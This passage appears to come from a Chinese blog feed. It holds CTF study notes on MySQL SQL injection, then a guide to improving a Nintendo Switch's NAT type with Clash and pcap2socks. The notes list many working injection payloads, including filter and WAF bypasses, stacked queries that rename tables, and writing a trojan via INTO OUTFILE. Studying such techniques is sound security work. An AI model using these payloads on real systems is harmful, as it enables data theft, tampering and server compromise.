<p>国赛碰到的题，过滤了&#x2F;**&#x2F;，但是没有过滤两个分开的内容，注入语句为<code>select * from fake_flag where id=$id limit 0, $limit</code><br>结果就是id处整一个&#x2F;*，limit处整一个*&#x2F;，把中间的部分处理掉了，太牛逼了</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是防御者对用户输入的恶意数据进行转义防止注入，但恶意数据在存入数据库（比如注册的用户名）后又恢复为原样，导致再次从数据库中取出时产生的SQL注入sqli-lab的less24为例<br>就本题而言，注册的用户名即为进行注入的语句，update的查询语句为<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code><br>这道题的目前解为通过恶意的用户名<code>admin&#39; #</code>注释掉查询语句后半部分内容，直接修改admin的密码进行登录<br>可以尝试使用sleep等函数，使用盲注尝试暴库<br>这里有一篇关于本题写的比较好的文章<br><a href="https://www.jianshu.com/p/3fe7904683ac">https://www.jianshu.com/p/3fe7904683ac</a></p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>替换方案：url编码 %20&#x3D;空格，%09&#x3D;tab %0a&#x3D;换行 %0b&#x3D;竖直tab %0c&#x3D;新的一页 %0d&#x3D;return %a0&#x3D;Linux下解析为空格，Windows下为不可见字符 皆可替换<br>&#x2F;**&#x2F;注释符代替空格<br>（）括号绕过空格，这里要注意括号括起的范围，防止查询语句出错<br>样例payload：<br><code> ?id=0&#39;union%3Aselect(1),(database()),(3)or(1)=&#39;1</code><br>这里不能将select后面的语句全部用括号括起来，而是需要每个用括号括起来之后用逗号连接</p>
<h4 id="部分位置的空格绕过"><a href="#部分位置的空格绕过" class="headerlink" title="部分位置的空格绕过"></a>部分位置的空格绕过</h4><p>\N 似乎等价于NULL<br><code>select * from users where id=\Nunion(select 1,1,1);</code><br>浮点数也可<br><code>select * from users where id=1.1union(select 1,1,1);</code><br>运算符号<br><code>select * from users where id=1.1union(select+1,1,1);</code><br><code>select * from users where id=1.1union(select-1,1,1);</code><br>!,~等符号均可</p>
<h4 id="补一个调了好久的payload"><a href="#补一个调了好久的payload" class="headerlink" title="补一个调了好久的payload"></a>补一个调了好久的payload</h4><p><code>select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())from(1))));</code></p>
<p><code>(select(ascii(substr((查询语句)from(1))))=a);</code><br>顺带没用上逗号</p>
<h3 id="bypass-infromation-schema"><a href="#bypass-infromation-schema" class="headerlink" title="bypass infromation_schema"></a>bypass infromation_schema</h3><p>常出现在对or的限制中，同时躺枪的还有order,password等语句</p>
<h4 id="innoDB引擎绕过"><a href="#innoDB引擎绕过" class="headerlink" title="innoDB引擎绕过"></a>innoDB引擎绕过</h4><p>该库在MySQL版本大于5.6.x的情况下存在两个表innodb_index_stats，innodb_table_stats<br>数据库版本可以用@@version或者version()查看<br><code>union select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</code>获取表名<br>使用innodb_index_stats获取库名</p>
<h4 id="sys库绕过"><a href="#sys库绕过" class="headerlink" title="sys库绕过"></a>sys库绕过</h4><p>innoDB绕过需要开启innoDB引擎，而mysql默认配置中该引擎是关闭的<br>使用sys库获取数据的话需要用户权限为root，可通过user()进行查看</p>
<p>使用<code>sys.schema_auto_increment_columns</code>库可以获取带有自增id列的表的表名<br>使用<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>库可以获取任意表名（大概？）</p>
<h4 id="join无列名注入"><a href="#join无列名注入" class="headerlink" title="join无列名注入"></a>join无列名注入</h4><p>先记一下payload<br>获取第一个列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b)c</code><br>获取后续列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</code></p>
<h4 id="已知表名情况下爆破列名"><a href="#已知表名情况下爆破列名" class="headerlink" title="已知表名情况下爆破列名"></a>已知表名情况下爆破列名</h4><p>利用(select 1,2,3,4,5 union select * from table_name)alias<br>此处需要反引号不被过滤<br>获得一个将所有列名用数字表示的表，然后<code>select `3` from (select 1,2,3,4,5 union select * from table_name)alias</code>即可将第三列无需列名的选出<br>结合实际情况的payload<br>select author_id,title from posts where author_id&#x3D; <code>-1 union select 1,(select group_concat(`3`) from (select 1,2,3,4,5 union select * from table_name)alias where 1=&#39;1&#39; limit 0,1)</code> limit是保证查出来的数据只有一个<br>select 1,2,3,4,5即该表拥有五个列，group_concat将整个列的数据拼接起来，where 1&#x3D;’1’为无效语句，用来闭合引号</p>
<p>逗号被过滤时多取几个别名，可以不用逗号<br><code>select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from table2)x;</code></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/4105#toc-0">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a><br><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p>
<h3 id="异或盲注入"><a href="#异或盲注入" class="headerlink" title="异或盲注入"></a>异或盲注入</h3><p>除去union联合注入，使用异或(^)盲注入也是一种办法<br>这种方法比较容易用括号拼出来语句，比较使用，但是注入时需注意符号优先级，比如在^面前，大小于号和等号的优先级是不一样的，最简单的解决方案就是把该异或判断里面的所有内容再用一个括号括起来即可<br>样例payload：<br><code>?id=1&#39;^(left((select(database())),1)&lt;&#39;q&#39;)^&#39;1</code><br>纯用括号的payload：<br><code>?id=1&#39;^(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),9)=&#39;emails,re&#39;)^&#39;1</code><br>用group_concat函数把所有的表名连接起来，以逗号分隔，不需使用limit，即可直接猜解表名<br><strong>一定要注意这里要把后面注入的语句整体用括号括起来！！！不然就会存在异或优先级不同导致注入失败</strong></p>
<h4 id="异或注入测试被过滤字符"><a href="#异或注入测试被过滤字符" class="headerlink" title="异或注入测试被过滤字符"></a>异或注入测试被过滤字符</h4><p><code>?id=1&#39;^length(&#39;测试字符串&#39;)&gt;0 #</code>即可测试被测试字符串是否被替换为空，进行被过滤项的测试</p>
<h3 id="select和union被过滤的注入"><a href="#select和union被过滤的注入" class="headerlink" title="select和union被过滤的注入"></a>select和union被过滤的注入</h3><p>遇到只是去掉第一次出现的select和union时双写即可<code>selselectect</code><br>有的只过滤全大写或全小写，大小写混搭即可<code>UniOn sEleCT</code><br>括号打断union select，即<code>union(select xxxx)</code></p>
<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>内联注释的作用就是时其他数据库将该内容视为注释，而MySQL则将该内容当做正常代码处理，提高MySQL与其他数据库的兼容性，同时内联注释中可以添加数字作为版本号，使得该语句只能在目前版本大于等于该版本号的情况下才能运行，可以此绕过部分检测<br>内联注释格式为<code>/*!xxxxxx*/</code><br><code>/*!union*/ /*!50010select*/</code>就可以绕过对<code>union select</code>的检测</p>
<h4 id="堆叠注入不使用select"><a href="#堆叠注入不使用select" class="headerlink" title="堆叠注入不使用select"></a>堆叠注入不使用select</h4><p>刚做了一个题，没得select我是真的没办法，见下文堆叠注入</p>
<h3 id="逗号被过滤的注入"><a href="#逗号被过滤的注入" class="headerlink" title="逗号被过滤的注入"></a>逗号被过滤的注入</h3><p>主要存在于盲注使用left，limit，substr函数等场合<br>limit使用offset绕过<br>样例payload：<br><code>select * from user limit 1 offset 0</code><br>substr()和mid()函数可以使用from to的方法绕过逗号<br>样例payload：<br><code>select substr(database() from 1 for 1)</code> 这里for 1指截取一位，实际上不要也可以（因为有时候or也没得了）</p>
<h4 id="join函数辅助注入"><a href="#join函数辅助注入" class="headerlink" title="join函数辅助注入"></a>join函数辅助注入</h4><p>需在可使用union联合注入时使用，主要用于逗号被过滤的情形<br>使用join语句可以将多个表拼接到一起进行查询，这时每个表需要设置一个别名，且注意查询数要与列数一致，假设有三列，样例payload:<code>union select * from ((select 1)a join (select 2)b join (select database())c)</code>，一个select语句内可用group_concat等函数进行更深层次的查询<br>马师傅用的一个payload<br><code>UNION SELECT * from ((select+1)a join (select 234)b join(select 3)c join(select group_concat(mdzz.3) from (select * from (select * from (select 1)asf join (select+2)adf join (select 3)asdnfio)ooo union select * from fl111aa44a99g)mdzz)d)</code><br>(说实话我没看懂为什么套了这么多层union select，我第一层直接查flag不就完了吗)</p>
<h3 id="大小于号被过滤的注入"><a href="#大小于号被过滤的注入" class="headerlink" title="大小于号被过滤的注入"></a>大小于号被过滤的注入</h3><p>同样常见于盲注，需要进行比较加快判断（也可以自己写脚本遍历就不怕了）<br>greatest函数和least函数返回参数列表中的最大&#x2F;小值<br>所以一个比较字符是否大于64的语句可以写为：<br><code>greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h3 id="等号被过滤的注入"><a href="#等号被过滤的注入" class="headerlink" title="等号被过滤的注入"></a>等号被过滤的注入</h3><p>等号可以直接用like语句替换，也可以使用&lt;&gt;不等号进行代替</p>
<h3 id="括号-被过滤的注入-union盲注入"><a href="#括号-被过滤的注入-union盲注入" class="headerlink" title="括号()被过滤的注入 | union盲注入"></a>括号()被过滤的注入 | union盲注入</h3><p>当括号被禁用时，SQL的函数便全部不能使用了，这个时候可以使用union盲注入，利用order by排序查询结果进行判断，具体使用看那篇[HBCTF]大美西安</p>
<h3 id="具有WAF防御的注入"><a href="#具有WAF防御的注入" class="headerlink" title="具有WAF防御的注入"></a>具有WAF防御的注入</h3><p>应该是有两个服务器，一个外层服务器将数据进过判别后再提交至内部服务器进行处理，由于两个服务器对同名参数的处理不同，可以创建两个同名参数，一个是正常数据另一个是恶意数据进行WAF防御的绕过<br>由于环境问题没有自己测试，只能贴一个文章了<br><a href="https://blog.csdn.net/nzjdsds/article/details/77758824">https://blog.csdn.net/nzjdsds/article/details/77758824</a></p>
<h3 id="引号被转义"><a href="#引号被转义" class="headerlink" title="引号被转义"></a>引号被转义</h3><p>1.宽字节注入<br> 这种情况适用于取消用于打破闭合的单个引号的转义，在gbk编码中一个汉字占两个字节，utf-8中一个汉字占三个字节<br> 在gbk字符集中，当第一个字符超过128时，则认为接下来两个字符为一个宽字符，我们可以用这个办法将增添的引号给变成一个汉字从而绕过。<br> 构造<code>?id=1%aa&#39;</code>即可<br> 这里我犯过一个很智障的毛病，在post提交数据的时候直接输入了%aa妄图绕过，结果当然是出问题，正确方法是通过bp抓包修改，这样才能urlencode<br>2.十六进制编码代替<br> 当爆列名时存在一个叫’user’的表名且引号被转义时，我们可以使用它的十六进制进行替换，即将user变为0x7573657273即可</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>据说功能十分强大，具体编码有hex，urlencode，ASCII之类的<br>例如：CHAR()函数进行拼接：<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code>即可获得’test’字符串</p>
<h4 id="urlencode绕过waf"><a href="#urlencode绕过waf" class="headerlink" title="urlencode绕过waf"></a>urlencode绕过waf</h4><p>waf可以理解为服务器前的一个屏障，负责过滤输入的内容，而有的waf是直接提取我们的query_string，这种PHP性质的检测不会对我们的urlencode的数据进行解码，我们就可以以urlencode的形式进行绕过<br>例如：<code>u%6eion</code>就可以进行对union的绕过</p>
<h4 id="二次解码绕过"><a href="#二次解码绕过" class="headerlink" title="二次解码绕过"></a>二次解码绕过</h4><p>有的网站存在着对url的二次解码，当我们的请求发送到服务器时，会发生第一次url解码，若此时还存在其他设置（如开启GPC），则会存在二次解码，此时我们可以使用<code>%2527</code>这样的语句通过二次解码构造注入<br>%25url解码为%，%27url解码为’</p>
<h3 id="MySQL字符集绕过"><a href="#MySQL字符集绕过" class="headerlink" title="MySQL字符集绕过"></a>MySQL字符集绕过</h3><p>MySQL默认字符集为Latin1，当用户端的字符集为utf-8时，存在一个字符集转换过程，此时，不完整的utf-8编码会被舍弃，可以绕过类似于<code>&#39;username&#39;===&#39;admin&#39;</code>的条件。<br>具体情况贴一个博文<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>SQL语句后台查询时以;为分隔，如果我们在一次查询中使用分号隔开语句，即可实现执行两个语句。<br>堆叠注入有时候不能得到返回值，所以需要用sleep之类的语句进行延时验证。但一般无法使用select时才会使用堆叠注入，因此可以使用<code>DO</code>语句进行执行，<code>DO</code>语句结束一个专门执行表达式的语句，在执行表达式上作为SELECT的替代品，eg:<code>DO sleep(5)</code></p>
<h3 id="堆叠注入和union-select的区别"><a href="#堆叠注入和union-select的区别" class="headerlink" title="堆叠注入和union select的区别"></a>堆叠注入和union select的区别</h3><blockquote>
<p>union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是<strong>任意的语句</strong>。 </p>
</blockquote>
<p>因为如果查询语句为<code>select * from users where username = $username</code>，使用union select就仍处于select语句下，而使用堆叠注入则可以重开一个语句，进行insert，delete等操作。</p>
<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>并不是所有的数据库都允许在一行中执行两个查询语句，某些API也会禁止或者开启这项功能，MySQL的某些版本可以执行堆叠注入，而Oracle就不允许这种操作，并且由于权限问题你也不一定能对数据进行修改</p>
<h3 id="不使用select语句进行注入"><a href="#不使用select语句进行注入" class="headerlink" title="不使用select语句进行注入"></a>不使用select语句进行注入</h3><p>本题来自强网杯2019随便注</p>
<h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>堆叠注入之后，我们可以执行任意语句，所以可以使用<code>show</code>来对数据进行展示<br><code>show database</code> <code>show tables/cloumns from xxxx</code>就可以直接对数据进行查询<br>最后一步没法使用show来进行查询了，而这里的语句应该为<code>select * from words where id=</code>，显示位由word表中的数据占据，且新开语句中无法使用select，这时我们将现在的表改名为words，还需将列对应修改为id和data，就能通过正常查询得到数据</p>
<p><code>`</code>是SQL中的转义字符，当我们的表名可能引起冲突时需要用<code>`</code>将其包围，保险起见可以将所有的表名用此包围<br>修改语句要在一次内做完，不然你先把words给改掉了，下次查询的时候先执行的select语句报错，后面还想把1919810931114514改成words就没戏了，同理还有对应的id和data<br>修改语句如下：<code>rename table `tablename` to `new_tablename` </code><br>增加数字列<br><code> alter table `tablename` add `columnname` int unsigned not Null auto_increment primary key</code><br>增加字符列<br><code>alert table `tablename` change `columnname` `newcolumnname`</code><br>抄一个完整的payload<br><code>?inject=1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p>
<p>这个句子将flag改为id且设置了其类型为可变字符串，设置字符集为utf-8<br>由于我们并不知道现在的flag是多少，所以我们以?id&#x3D;1’ or 1&#x3D;1的形式查询到flag</p>
<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>玄妙的拼凑语句执行<br><code>use information_schema;set @sql=concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name=&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</code><br>感觉更加万能了，可以随意绕过</p>
<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，强网杯随便注强化版，给了一个超级过滤，直接把上面的所有方法给ban了<br><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>拼凑语句需要set和prepare，挂了，利用现有查询语句查需要rename，挂了，基本注入需要select，挂了，全挂。人傻了<br>最后师傅说用handler语句代替select堆叠注入，搜不到这个语句，最最最后直接搜wp才搜到这个东西。<br>这个语句是mysql独有的，其他数据库并不能使用</p>
<pre class=" language-mysql"><code class="language-mysql">handler table_name open;
handler table_name read first/next; #读第一行数据或读下一行数据
</code></pre>
<p>可以先用show tables;之类的语句摸清楚结构，然后用handler查询<br>payload: <code>1&#39;;handler open FlagHere;handler FlagHere read first;#</code></p>
<h3 id="修改SQL配置的新知识"><a href="#修改SQL配置的新知识" class="headerlink" title="修改SQL配置的新知识"></a>修改SQL配置的新知识</h3><p>以SUCTF的easy_sql为例，这里后台的查询语句为<code>select $query || flag from Flag</code>（大佬wp说是判断出来了，我是判断不出来），测试之后发现注释符被过滤，or和union等常用语句被过滤，试了半天最后发现是整形注入，差点忘了这茬，但是可以使用堆叠注入。爆到列为Flag之后没法继续做了，这时拿出我们的新知识，修改<code>||</code>或运算符为连接符，就可以直接把flag给带出来啦。<br>payload<code> 1;set sql_mode=pipes_as_concat;select 1</code></p>
<p>这个题没出完，使用出现了很多低级的非预期解，比如<code>*,1</code>使得查询语句为<code>select *,1 || flag from Flag</code>这里1和后面的或结合，select  *就获取了全部数据</p>
<h4 id="ps-1"><a href="#ps-1" class="headerlink" title="ps"></a>ps</h4><p>SQL字符串弱类型比较和PHP字符串和数字弱类型比较一致</p>
<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>该类注入的注入语句为<code>$sql = &quot;SELECT * FROM users ORDER BY $id</code><br>此时我们使用<code>?id=1 desc</code>和<code>?id=1 asc</code>（升降序）观察结果有无变化，判断是否存在order by注入。<br>order by 不同于的我们在 where 后的注入点，不能使用 union 进行注入</p>
<h3 id="rand-注入"><a href="#rand-注入" class="headerlink" title="rand()注入"></a>rand()注入</h3><p><code>?id=1 and rand(true) 或 rand(false)</code>时，返回的结果是不一致的，且重复使用rand(true)的结果不会变化，因此可以使用rand()函数进行bool盲注入</p>
<h3 id="时间盲注入"><a href="#时间盲注入" class="headerlink" title="时间盲注入"></a>时间盲注入</h3><p>order by语句后可以以<code>?id=1 and if()</code>这样的形式接一个语句，（不知道为什么）无论if结果真伪与否都不会影响order by的结果，但是我们这里可以使用时间盲注产生延迟</p>
<h3 id="procedure-analyse报错注入"><a href="#procedure-analyse报错注入" class="headerlink" title="procedure analyse报错注入"></a>procedure analyse报错注入</h3><p>是报错注入的一种，使用方法<code>procedure analyse(extractvalue(.....))</code></p>
<h3 id="聚合函数注入"><a href="#聚合函数注入" class="headerlink" title="聚合函数注入"></a>聚合函数注入</h3><p>这里也可以使用聚合函数进行注入<code>?id=1&#39; and (select....聚合注入语句)</code></p>
<h3 id="导入木马注入"><a href="#导入木马注入" class="headerlink" title="导入木马注入"></a>导入木马注入</h3><p>order by后可以使用<code>?id=1&#39; into outfile &#39;路径&#39;  lines terminated by 0x....</code>0x后为被16进制转码的文件，将木马写入该路径下</p>
<h2 id="SQL弱类型"><a href="#SQL弱类型" class="headerlink" title="SQL弱类型"></a>SQL弱类型</h2><p>在整型类变量作为查询内容时，一大过滤方法是直接将数据转化为整形。字符串转数字的规则同PHP，即以数字开头则转换为开头数字，否则为0</p>
<h2 id="PDO-desc注入"><a href="#PDO-desc注入" class="headerlink" title="PDO desc注入"></a>PDO desc注入</h2><p>待研究</p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2OTUzMzg3Ng==&mid=2247484074&idx=1&sn=2bcac1abf8364cc4040d2f3cb07e21d6&chksm=eadf9571dda81c678acffc2e79a4363d085e372428a14cb525e324c1e9e492a84d6d52b7d054&mpshare=1&scene=23&srcid=12167GnqMynTveY20gEIhScx&sharer_sharetime=1576496036398&sharer_shareid=ae6683d6c0e7df9a0b7c15e7cacf6b3c#rd">WriteUp | Magic key</a><br><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究</a><br><a href="https://www.cnblogs.com/wfzWebSecuity/p/12049920.html">https://www.cnblogs.com/wfzWebSecuity/p/12049920.html</a></p>
<h2 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h2><p>与mysql存在一点的语法差异，where后面一定要跟bool表达式，pg_sleep返回的是void，就不能直接用，详见RoarCTF2020的SQL注入wp</p>
<h2 id="MySQL-8-0特性"><a href="#MySQL-8-0特性" class="headerlink" title="MySQL 8.0特性"></a>MySQL 8.0特性</h2><p>引入了元组比较TABLE，VALUE等语句，可以不需要列名不需要SELECT语句的进行注入，也详见RoarCTF2020的wp</p>
<h2 id="SQL中的字符截取函数"><a href="#SQL中的字符截取函数" class="headerlink" title="SQL中的字符截取函数"></a>SQL中的字符截取函数</h2><pre class=" language-mysql"><code class="language-mysql">Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)
</code></pre>
<h2 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/a63912d4b5ad">https://www.jianshu.com/p/a63912d4b5ad</a></p>
<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这篇文章一开始都是我刚入门CTF写的了，零零散散记录了很多乱七八糟的trick，可能存在很多当时没懂乱写的东西，也就是谬误，但是现在也懒得重新再排版整理了。。。<br>说到底，当SQL预处理出现的时候，SQL注入基本上就不存在了，但是马师傅也曾经和我说过SQL预处理并不能保证绝对安全，在特殊位置的字段经过了预处理仍可能产生漏洞，不过到了这个层面，使用预处理基本上就与SQL注入无缘了<br>而实际实战中对SQL注入的过滤，基本上要么一个预处理封死，要么年久失修根本不设防，如上的trick们也就供大家玩CTF的时候作为一个小小的技巧罢了</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>Switch自建NAT优化指北</title>
    <url>/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97.html</url>
    <content><![CDATA[<h1 id="Switch自建NAT优化指北"><a href="#Switch自建NAT优化指北" class="headerlink" title="Switch自建NAT优化指北"></a>Switch自建NAT优化指北</h1><p>之前有一篇Switch的NAT自建加速方案遇到很多大哥和我讨论，在交流的过程中又学习了一些新的东西，很有意思。再订正一下之前写的东西，提供一个自建加速器的基本使用方案，因为纯软件实现方案总是不怎么靠谱，所以就把名字叫指北吧，借鉴自不知道什么时候看到的一个大哥写的教程的名字</p>
<p>本文仅提供纯软件解决方案，买个路由器刷固件理论上为最稳定方案，本文不做考虑</p>
<p>本文仅提供NAT类型优化方案，不一定能提升速度和联机质量，<strong>有说不清楚的地方可能在之前几篇相关文章中提到过了</strong></p>
<p>目前的方案已经亲测可用了，（应该）不会出现之前的问题了吧。。。<br>之前的一些研究。。。<br><a href="https://blog.z3ratu1.cn/tags/Switch/">tag Switch</a></p>
<h2 id="Clash流量接管"><a href="#Clash流量接管" class="headerlink" title="Clash流量接管"></a>Clash流量接管</h2><p>之前提到过，switch的代理设置只对TCP流量进行代理，就是Eshop下载和看新闻之类的功能，游戏大多使用的是UDP流量，所以不能仅通过Switch自带的代理设置加速游戏，场面上大部分的游戏都是UDP通信的，所以很多游戏加速器都是通过网络层接管流量进行代理<br>使用Clash for windows进行网络层的流量接管，照着百度配Service mode，新建一个Clash网卡开启TUN模式全局接管流量，具体表现形式为QQ登录地点变得诡异等</p>
<p>Clash流量接管有两种方式，都需要Clash启动Service mode。<br><del>一种是设置Switch和PC连接同一WiFi，把Switch的网关设置为PC，但是这个方案在后来使用的时候Switch一直报DNS解析失败，开启PC路由转发之后clash内存跑满CPU跑满也不能用。后来也忘了当初配置是咋调的了。。。。</del>（就是一个旁路由方案，产生记忆紊乱？作者提到了windows下clash无法作为网关使用。。。直接放弃该方案）<br><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/1865">clash windows tun模式 作为网关 没有转发其他设备的请求 #1865</a><br>第二种是PC再开一个热点，Switch直接连接热点，在网络适配器设置那把Clash的虚拟网卡和热点网卡进行共享，同样能接管Switch流量，但缺点在于switch联机的时候最好是代理全局，这样子TUN会把不仅是switch，以及PC上的全部流量进行代理。麻</p>
<h3 id="2022-2-12-update"><a href="#2022-2-12-update" class="headerlink" title="2022.2.12 update"></a>2022.2.12 update</h3><p>发现了优雅的解决方案<br>由于上述两种方案均需要clash启动service mode，即通过新建TUN设备的方式接管整台机器的流量。要么就规则难写，要么把QQ之类的代理了也很尴尬。<br>用GitHub上的这个项目，看到这里的时候我才真正理解了UU等加速器的实际实现原理以及我所需要的是什么样的一个解决方案。</p>
<p>说到底，我需要的是能够代理switch的流量，而switch本身不支持设置代理UDP流量。因此需要通过网关的方式来强行获取到switch的流量并进行转发。因此路由器刷固件是最优方案，而这里的临时方案使用PC来代替路由器，就会出现规则难写或者奇怪的网络问题崩盘或是PC流量全局被代理等问题。</p>
<p>而实际上UU等加速器要求你填一个网关，实际上应该是通过ARP欺骗的方式来把流量拐过来，再监听网卡把对应IP发来的流量按照代理规则进行转发。而不是直接把网关填PC让PC充当路由再配合全局代理把网络搞炸。。。</p>
<p>那么，这个解决方案不需要进行全局的代理，使用GitHub的这个项目即可，原理如上所述<br>所需工具 clash + <a href="https://github.com/zhxie/pcap2socks">pcap2socks</a><br>不熟练的用户可以配套使用其GUI图形界面，启用图形界面可以通过clash的UWP loopback功能，在<code>桌面应用web查看器</code>那栏勾上保存即可</p>
<p>使用图形界面的时候有一个测速和测延迟功能，会导致其一直向代理服务器发udp数据包，抓包研究的时候就很不方便，直接命令行启动也行<br><code>.\pcap2socks -s 172.24.2.102 -p 172.24.1.102 -d 127.0.0.1:7890 -i 网卡名</code></p>
<p>此时clash<strong>不需要启动TUN模式</strong>，这是我非常喜欢的一点，如果你选用pcap2socks图形化界面基本上一路下一步就行了。。。网卡选择上网的那块网卡，一般来说就是WIFI那块。最后的服务器直接填localhost:7890（7890为clash默认本地代理端口），就等于是把switch的流量捕获起来转发到clash了。然后clash中配好自己的服务器随意切换，快乐起来了。一般来说机场节点是有额外限制的，所以机场节点的链路质量虽然高，但绝大多数的NAT类型都极差，无法使用，有的机场可能提供游戏节点，也许就能拿来试试。</p>
<h4 id="原理证明"><a href="#原理证明" class="headerlink" title="原理证明"></a>原理证明</h4><p>用wireshark抓包看看是不是通过arp欺骗的方式来诱骗流量然后监听网卡进行转发的<br>这个是其生成的配置项<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/config.png" alt="config.png"></p>
<p>然后在switch上填好，wireshark抓包<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/arp.png" alt="arp.png"><br>可以很显然的看到，switch认为自己的IP就是172.24.2.102（屁话)，并开始寻找他的网关，172.24.1.102，而此时我们的PC就给他回了一个消息，说我就是172.24.1.102，这样switch的流量就会转发到PC上来了。</p>
<p>接下来switch正正常常的直接向其目的地发送请求，从<code>172.24.2.102-&gt;8.8.8.8</code><br>被我们捕获下来，经过本地的环回发到7890的clash端口上，再从clash发出去，变成了<code>192.168.1.102-&gt;代理服务器地址</code>，然后再从代理服务器返回回来，最后由pcap2socks捏一个<code>8.8.8.8-&gt;172.24.2.102</code>的包返回去，完成一次交互<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/traffic.png" alt="traffic.png"></p>
<p>但这里PC是不能开启路由转发的，因为这个流量实际上是pcap2socks监听网卡来捕获，再重新转发出去的，开启路由可能导致不可预期的错误（说起来最上面的被弃置的方案1，可能又是因为没有开启路由转发导致了虽然设置了网关，但无法进行转发所以无法连接，但设置了路由转发，可能会因为出口网卡和Clash网卡产生环回流量而爆炸，因此该计划完全失败）</p>
<h2 id="NAT类型提升"><a href="#NAT类型提升" class="headerlink" title="NAT类型提升"></a>NAT类型提升</h2><p>在自己的VPS上搭一个酸酸服务端（因为酸酸开销小，虽然理论上来说安全性不是很靠谱？），具体过程百度，自己写一个Clash规则添加VPS上去，Clash开全局代理<br>使用pcap2socks也可实现NAT类型改善<br>至于联机质量么。还是看你的机器用的线路以及和你联机的人的情况</p>
<p>一开始连校园网的垃圾网络<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/D.jpg" alt="D.jpg"><br>接上自己的小水管NAT类型就变成B了，如图<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/B.jpg" alt="B.jpg"><br>一开始还纳闷过公网VPS的NAT应该直接是A才对，后来思考了一下发现是阿里云自带的防火墙的问题，再把端口全开就能把NAT类型提升至A，如图<br><img src="/images/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97/A.jpg" alt="A.jpg"><br>但是网络速度并没有什么太大的提升。。。</p>
<p>这里我一直想研究一下能不能区别Switch流量和PC的流量，毕竟开全局总是不怎么好。阿里云小水管的带宽也很有限，PC分一下感觉会亏很多，并且还会导致很多软件表现奇怪，比如QQ的香港登录。。。要不就得把PC上的东西都关掉（我现在就是这么做的）</p>
<p><strong>但是使用强有力的pcap2socks就不用考虑流量分流了，不开全局，优雅，我爱</strong><br>接下来的文章内容可忽略</p>
